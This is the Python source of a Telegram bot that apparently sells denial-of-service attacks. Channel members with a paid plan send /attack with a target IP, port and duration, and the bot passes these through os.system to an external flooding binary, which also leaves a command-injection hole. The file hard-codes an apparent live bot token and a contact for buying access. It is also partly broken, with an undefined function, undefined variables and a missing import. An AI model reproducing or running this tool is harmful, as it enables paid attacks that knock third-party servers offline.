import os
import telebot
import logging
import random
import asyncio
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

# Configuration
TOKEN = '8088145465:AAEFPiToY3dQP3nySYJkRy4uAgtdwICtTvg'
ADMIN_USER_ID = 8179218740
CHANNEL_USERNAME = "@MUSTAFA LEAKS😮‍💨"  # Replace with your actual channel username

logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
loop = asyncio.get_event_loop()

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
attack_in_progress = False

# In-memory storage
users = {}
keys = []

# Function to Check Channel Membership
def is_user_member(user_id):
    try:
        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception as e:
        logging.error(f"Error checking membership: {e}")
        return False

# Start Command
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id

    if not is_user_member(user_id):
        bot.reply_to(
            message,
            f"🚫 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧!\n\n"
            f"🔗 𝗝𝗢𝗜𝗡 𝗡𝗢𝗪: [Jᴏɪɴ Cʜᴀɴɴᴇʟ](https://t.me/+KLjoHUXoBGsxM2Rl)",
            parse_mode="Markdown"
        )
        return

    bot.reply_to(message, "✅ Wᴇʟᴄᴏᴍᴇ! Yᴏᴜ Cᴀɴ Nᴏᴡ Usᴇ Tʜᴇ Bᴏᴛ.")

# Attack Command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id

    if not is_user_member(user_id):
        bot.reply_to(
            message,
            f"🚫 𝗬𝗢𝗨 𝗠𝗨𝗦𝗧 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗!\n\n"
            f"🔗 𝗝𝗢𝗜𝗡 𝗡𝗢𝗪: [Jᴏɪɴ Cʜᴀɴɴᴇʟ](https://t.me/+KLjoHUXoBGsxM2Rl)",
            parse_mode="Markdown"
        )
        return

    if attack_in_progress:
        bot.reply_to(message, "⏰ Aɴ Aᴛᴛᴀᴄᴋ Iɴ Pʀᴏɢʀᴇss. Pʟᴇᴀsᴇ Wᴀɪᴛ.")
        return

    user_data = users.get(user_id)
    if not user_data or user_data['plan'] == 0:
        bot.reply_to(message, "DM @SIDIKI_MUSTAFA_47 to get access.")
        return

    try:
        args = message.text.split()
        target_ip, target_port, duration = args[1], int(args[2]), int(args[3])

        if duration > 150:
            bot.reply_to(message, "⚠️ Mᴀxɪᴍᴜᴍ Aᴛᴛᴀᴄᴋ Dᴜʀᴀᴛɪᴏɴ Is 150 Sᴇᴄᴏɴᴅs!")
            return

        if target_port in blocked_ports:
            bot.reply_to(message, "Port is blocked. Use a different port.")
            return

        # Binary execution command added
        os.system(f"./Moin {target_ip} {target_port} {duration} 1000")

        asyncio.run_coroutine_threadsafe(run_attack(target_ip, target_port, duration), loop)
        bot.reply_to(message, f"🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!\n🎯 Target Locked: {ip}:{port}\⏳ Countdown: {duration} seconds\n📈 𝗔𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝘁𝘂𝘀 :- 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...")
    except Exception as e:
        logging.error(f"Error processing attack command: {e}")
        bot.reply_to(message, "🚀 Use /attack <IP> <Port> <Time>.")

# Start Asyncio Loop
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Bot is running...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(5)
